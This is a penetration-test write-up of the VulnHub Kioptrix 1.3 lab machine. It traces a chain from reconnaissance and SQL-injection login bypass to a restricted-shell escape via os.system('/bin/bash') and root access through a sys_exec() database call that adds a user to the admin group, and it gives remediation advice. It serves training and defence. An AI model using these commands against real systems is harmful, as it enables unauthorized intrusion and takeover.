# 📝 Penetration Testing Report

## 🎯 VulnHub — Kioptrix Level 1.3

> **Platform:** VulnHub  
> **Target:** Kioptrix 1.3 / Kioptrix 4  
> **Target IP:** `192.168.96.23`  
> **Attacker:** Kali Linux  
> **Network:** VirtualBox Host-Only Network  
> **Objective:** Obtain initial access and determine whether the system can be fully compromised.

---

# 🧰 Tools Used

- `arp-scan` — host discovery
- `Nmap` — port and service enumeration
- `Gobuster` — web directory enumeration
- `WhatWeb` — technology identification
- `Enum4linux` — additional SMB enumeration
- `Burp Suite` — HTTP request interception and modification
- SQL injection payloads — authentication bypass testing
- `SSH` — remote access
- `MySQL` — database analysis
- `Netcat` — network communication
- `Python` — shell escape / command execution

---

# 📋 Executive Summary

During the assessment of **Kioptrix Level 1.3**, I identified a chain of vulnerabilities that allowed me to move from network reconnaissance to complete system compromise.

The initial attack vector was a **SQL Injection** in the web application's authentication mechanism. The vulnerability allowed authentication to be bypassed and exposed valid credentials for the `john` account.

The credentials were then used to access the system through SSH. However, `john` was placed inside a restricted shell with only a limited set of commands available.

I was able to escape this restricted environment by abusing Python execution and launching `/bin/bash`.

After obtaining a normal shell, I discovered `checklogin.php` inside `/var/www`. The file contained credentials used to access the database. Further database analysis revealed the ability to execute operating-system commands through `sys_exec()`.

I used this capability to add `john` to the `admin` group:

```
usermod -a -G admin john
```

After reconnecting with the updated privileges, `sudo su` provided a root shell.

The complete attack chain was:

```
Host Discovery
      ↓
Port Enumeration
      ↓
HTTP Enumeration
      ↓
Web Application Analysis
      ↓
SQL Injection
      ↓
Authentication Bypass
      ↓
john Credentials
      ↓
SSH Access
      ↓
Restricted Shell
      ↓
Python / Bash Escape
      ↓
Full Shell
      ↓
Database Credential Discovery
      ↓
OS Command Execution via sys_exec()
      ↓
john → admin
      ↓
sudo su
      ↓
ROOT
      ↓
FLAG
```

---

# 🎯 1. Scope

Testing was performed against the isolated VulnHub virtual machine:

```
Target: 192.168.96.23
Network: 192.168.96.0/24
```

The machine was running inside a VirtualBox Host-Only network.

---

# 🛰️ 2. Host Discovery

## Objective

The first step was to determine which host in the laboratory network belonged to the target machine.

I used:

```
sudo arp-scan -I eth1 192.168.96.0/24
```

The target host was identified as:

```
192.168.96.23
```

Because the target was located in a local VirtualBox Host-Only network, ARP scanning was an appropriate method for identifying active hosts.

After identifying the IP address, I moved on to identifying the exposed attack surface.

---

# 🔍 3. Port and Service Enumeration

I performed a full TCP port scan with service and OS detection:

```
sudo nmap -sV -A -p- 192.168.96.23
```

The following services were identified:

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 4.7p1|
|80/tcp|HTTP|Apache 2.2.8 / PHP 5.2.4|
|139/tcp|NetBIOS/SMB|Samba|
|445/tcp|SMB|Samba 3.0.28a|

Nmap also identified the operating system as Linux with a 2.6.x kernel.

### Initial attack-surface assessment

At this point, three services immediately stood out:

- **HTTP** — likely candidate for initial access.
- **SMB** — potentially useful for user and resource enumeration.
- **SSH** — potentially useful once valid credentials were obtained.

Therefore, I decided to investigate each service separately.

---

# 🌐 4. HTTP Enumeration

Nmap identified the web service as:

```
Apache httpd 2.2.8
PHP/5.2.4-2ubuntu5.6
```

The server supported:

```
GET
HEAD
POST
OPTIONS
```

Nmap also discovered several potentially interesting resources:

```
/database.sql
/icons/
/images/
/index/
```

The `/database.sql` file was particularly interesting because a database backup could potentially contain credentials or application information.

---

# 📂 5. Directory Enumeration

To expand the attack surface, I used Gobuster:

```
gobuster dir \
-u http://192.168.96.23/ \
-w /usr/share/wordlists/dirb/common.txt
```

The following resources were discovered:

```
/images
/index
/index.php
/john
/logout
/member
/server-status
```

However, reviewing the discovered directories did not immediately reveal a direct exploitation path.

At this point, instead of continuing to blindly enumerate directories, I decided to focus on understanding how the web application itself worked.

---

# 🧪 6. Technology Identification

I used WhatWeb to obtain additional information:

```
whatweb http://192.168.96.23
```

The application was identified as:

```
Apache 2.2.8
Ubuntu Linux
PHP 5.2.4-2ubuntu5.6
Suhosin-Patch
PasswordField
```

The presence of a login form made authentication logic the next logical area to investigate.

---

# 💉 7. SQL Injection

## Objective

The goal was to determine whether the authentication mechanism correctly handled user-controlled input.

First, I tested whether repeated failed login attempts resulted in account lockout. No effective lockout mechanism was observed.

I then moved to **Burp Suite** to intercept and manipulate the authentication requests.

The request was intercepted through:

```
Proxy → Intercept
```

and subsequently sent to:

```
Proxy → HTTP history → Send to Intruder
```

I used:

```
Username: john
```

and tested SQL injection payloads against the password parameter.

One of the payloads successfully altered the application's authentication logic and bypassed authentication.

### Result

After successful exploitation, I reached the page associated with the `john` account and obtained:

```
Username
Password
```

This provided valid credentials for subsequent access.

---

# ⚠️ Finding KI-01 — SQL Injection / Authentication Bypass

**Severity:** 🔴 Critical  
**CVSS v3.1:** **9.8**

**Vector:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### Impact

An attacker could:

- bypass authentication;
- access protected application functionality;
- obtain user information;
- obtain valid credentials;
- use those credentials for further compromise.

### Recommendations

- Use prepared statements / parameterized queries.
- Never concatenate user input directly into SQL queries.
- Implement strict input validation.
- Apply least privilege to database accounts.
- Implement effective authentication rate limiting and lockout controls.

The CVSS score above represents an assessment of the laboratory vulnerability and should not be interpreted as an official CVE score.

---

# 🖥️ 8. SSH Access

After obtaining `john`'s credentials, I checked whether they could be used for remote access.

Because the target used an old SSH implementation, I connected using:

```
ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.96.23
```

Access was successful.

However, `john` did not receive a normal Bash shell. Instead, the account was placed inside a restricted shell.

Available commands included:

```
cd
clear
echo
exit
help
ll
lpath
ls
```

This meant that simply obtaining valid credentials was not sufficient to fully interact with the system.

---

# 🐚 9. Restricted Shell Escape

I then analyzed the available commands and looked for a way to execute functionality outside the intended restrictions.

The `echo` functionality could be abused to execute Python code:

```
echo os.system('/bin/bash')
```

This resulted in the execution of:

```
/bin/bash
```

and provided a full Bash shell.

### Result

The restricted shell was successfully bypassed.

I then performed basic local enumeration:

```
id
pwd
sudo -l
```

No immediate privilege-escalation path was identified.

---

# 🔎 10. Local Enumeration

Since direct privilege escalation was not immediately apparent, I shifted the focus from system binaries to application files.

While examining:

```
/var/www
```

I discovered:

```
checklogin.php
```

After reviewing the file contents, I found database credentials used by the web application.

This was an important pivot point: instead of attempting to exploit the operating system directly, I could now investigate the application's backend infrastructure.

---

# 🗄️ 11. Database Analysis and OS Command Execution

Using the discovered credentials, I accessed the database and investigated its available functionality.

A particularly dangerous function was identified:

```
sys_exec()
```

I used:

```
select sys_exec('usermod -a -G admin john');
```

This resulted in the execution of the following operating-system command:

```
usermod -a -G admin john
```

The command added `john` to the `admin` group.

### Why this was critical

The database was no longer isolated from the underlying operating system.

The ability to execute arbitrary system commands from a database context created a direct bridge:

```
Database
   ↓
sys_exec()
   ↓
Operating System
```

This significantly increased the impact of the database compromise.

---

# ⚠️ Finding KI-02 — OS Command Execution via `sys_exec()`

**Severity:** 🔴 Critical  
**CVSS:** **9.8***

### Impact

An attacker with access to the database could potentially execute arbitrary operating-system commands.

This effectively allowed the attacker to escape the database security boundary and interact directly with the host OS.

### Recommendations

- Disable dangerous OS-command execution functions.
- Restrict database functionality to the minimum required by the application.
- Use a dedicated low-privileged database account.
- Prevent the database service from executing commands as a privileged OS user.
- Monitor database activity for unexpected system-command execution.

* This is a laboratory-specific CVSS estimate rather than an official CVE score.

---

# 👑 12. Privilege Escalation

After executing:

```
usermod -a -G admin john
```

I exited the database environment and used:

```
sudo su
```

After entering `john`'s password, the shell changed to:

```
root
```

The resulting privileges were confirmed using:

```
id
```

This confirmed successful privilege escalation to the highest level available on the system.

---

# 🚩 13. Flag

After obtaining root access, I inspected:

```
/root
```

The directory contained the flag used to confirm successful completion of the machine.

Therefore, full system compromise was achieved.

---

# 🔗 14. Complete Attack Chain

```
192.168.96.23
      │
      ▼
   ARP Scan
      │
      ▼
     Nmap
      │
      ├─────────────┐
      ▼             ▼
     HTTP           SMB
      │
      ▼
   Gobuster
      │
      ▼
   WhatWeb
      │
      ▼
 Authentication Page
      │
      ▼
   Burp Suite
      │
      ▼
  SQL Injection
      │
      ▼
Authentication Bypass
      │
      ▼
 john Credentials
      │
      ▼
      SSH
      │
      ▼
 Restricted Shell
      │
      ▼
 Python → Bash Escape
      │
      ▼
 Full Shell as john
      │
      ▼
 /var/www/checklogin.php
      │
      ▼
Database Credentials
      │
      ▼
   sys_exec()
      │
      ▼
 john → admin
      │
      ▼
    sudo su
      │
      ▼
     ROOT
      │
      ▼
     FLAG
```

---

# 🚨 15. Findings Summary

| ID    | Finding                                            | Severity    | CVSS    |
| ----- | -------------------------------------------------- | ----------- | ------- |
| KI-01 | SQL Injection / Authentication Bypass              | 🔴 Critical | **9.8** |
| KI-02 | Restricted Shell Escape                            | 🟠 High     | **8.8** |
| KI-03 | Database Credentials Exposed in Application Source | 🟠 High     | **8.8** |
| KI-04 | OS Command Execution via `sys_exec()`              | 🔴 Critical | **9.8** |
| KI-05 | Excessive Privileges Granted to `john`             | 🔴 Critical | **9.8** |
| KI-06 | Outdated Apache/PHP/Samba/SSH Components           | 🟠 High     | —       |

The CVSS values marked with `*` are estimates for the VulnHub laboratory scenario and are not official CVE scores.

---

# 🛡️ 16. Recommendations

### 1. Fix the SQL Injection

Implement:

- prepared statements;
- parameterized queries;
- strict input validation;
- proper output handling.

---

### 2. Remove Credentials from Application Source Code

Database credentials should not be exposed through application files accessible to compromised users.

Secrets should be stored using an appropriate secrets-management mechanism or protected configuration with restrictive permissions.

---

### 3. Remove OS Command Execution from the Database

Functions such as:

```
sys_exec()
```

should not be available to ordinary application database users.

The database account should have only the permissions required for normal application functionality.

---

### 4. Secure the Restricted Shell

If restricted shells are required, administrators should ensure that users cannot escape the environment through:

- interpreters;
- scripting languages;
- shell execution;
- command substitution;
- vulnerable utilities;
- programs that provide arbitrary code execution.

---

### 5. Apply Least Privilege

The `john` account should not be able to obtain administrative privileges merely by modifying its group membership.

Administrative permissions should be explicitly defined and audited.

---

### 6. Update Legacy Software

The assessment identified highly outdated components:

```
Apache 2.2.8
PHP 5.2.4
Samba 3.0.28a
OpenSSH 4.7p1
Linux 2.6.x
```

These components should be upgraded to supported versions and regularly patched.

---

# 🧠 17. Methodology and Decision-Making

One of the most important aspects of this machine was that the attack did not depend on a single vulnerability.

The compromise was achieved by chaining several weaknesses together.

### Step 1 — Identify the attack surface

```
ARP Scan
   ↓
Nmap
   ↓
HTTP + SMB + SSH
```

### Step 2 — Focus on the web application

```
Gobuster
   ↓
WhatWeb
   ↓
Authentication Form
```

Directory enumeration alone did not provide an obvious entry point, so the focus shifted toward application logic.

### Step 3 — Test authentication

```
Burp Suite
   ↓
Intruder
   ↓
SQL Injection
```

The SQL injection resulted in authentication bypass and valid credentials.

### Step 4 — Reuse the credentials

```
john credentials
      ↓
     SSH
```

The credentials provided access, but the shell was restricted.

### Step 5 — Escape the restricted environment

```
Restricted Shell
      ↓
Python execution
      ↓
/bin/bash
```

This transformed the limited SSH access into a normal system shell.

### Step 6 — Enumerate locally

Instead of immediately searching for kernel exploits, I analyzed the application files and found:

```
/var/www/checklogin.php
```

This revealed database credentials.

### Step 7 — Pivot through the database

```
Database
   ↓
sys_exec()
   ↓
OS Command Execution
```

### Step 8 — Escalate privileges

```
usermod -a -G admin john
             ↓
         john → admin
             ↓
          sudo su
             ↓
            root

```